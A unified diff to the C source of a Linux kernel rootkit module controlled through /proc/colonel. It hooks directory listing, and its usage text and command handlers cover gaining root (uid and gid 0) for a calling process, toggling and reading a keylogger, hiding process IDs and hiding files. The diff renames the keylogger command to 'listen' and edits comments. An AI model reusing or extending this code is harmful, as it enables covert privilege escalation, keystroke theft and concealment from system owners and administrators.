@@ -131,8 +131,9 @@ static int new_fs_readdir(struct file *filp, void *dirent, filldir_t filldir) {
 	return og_fs_readdir(filp, dirent, new_fs_filldir);
 }
 
-static int read_colonel(char *buffer, char **buffer_location, off_t off, 
-						int count, int *eof, void *data) {				/* reads /proc/colonel */
+/* read_colonel and write_colonel follow typical read/write kernel conventions, defined from the user p.o.v  --
+ * read_colonel writes to /proc/colonel and write_colonel reads from /proc/colonel */
+static int read_colonel(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data) {
 	int size;
 
 	sprintf(module_status, 
@@ -142,13 +143,13 @@ static int read_colonel(char *buffer, char **buffer_location, off_t off,
 USAGE:\n\
   From command line --\n\
   $ echo -n <command> >> /proc/colonel\n\n\
-  From colcmd --\n\
-  $ ./rtcmd <command>\n\n\
+  From rtcmd --\n\
+  $ sudo ./rtcmd <command>\n\n\
   To get root access --\n\
-  $ ./rtcmd hackbright /bin/bash\n\n\
+  $ sudo ./rtcmd hackbright /bin/bash\n\n\
 COMMANDS:\n\
   hackbright - uid and gid 0 for writing process\n\
-  tls - toggles keylogger listening on/off\n\
+  listen - toggles keylogger listening on/off\n\
   keylog -- print keyboard input log; keylogger is set to 0\n\
   hpXXXX - hides process id XXXX\n\
   sp - shows last hidden process\n\
@@ -164,7 +165,7 @@ STATUS-------------------------------------------\n\
 
 	size = strlen(module_status);
 
-	if (off >= size) {
+	if (off >= size) {											/* ensures the read function isn't continuously called */
 		return 0;
 	}
   
@@ -192,13 +193,11 @@ static int write_colonel(struct file *file, const char __user *buff, unsigned lo
 	} else if (!strncmp(buff, "sp", MIN(2, count))) {							/* shows last hidden process */
 		if (current_pid > 0) current_pid--;
 
-	} else if (!strncmp(buff, "tls", MIN(3, count))) {							/* toggle keylogger on/off */
+	} else if (!strncmp(buff, "listen", MIN(3, count))) {							/* toggle keylogger on/off */
 		key_logger = !key_logger;
-		if (current_pid > 1) current_pid--;
 	
 	} else if (!strncmp(buff, "keylog", MIN(6, count))) {							/* toggle keylogger on/off */
 		key_logger = 0;
-		if (current_pid > 1) current_pid--;
 
 	} else if (!strncmp(buff, "thf", MIN(3, count))) {							/* toggles hidden_files in fs */
 		hidden_files = !hidden_files;
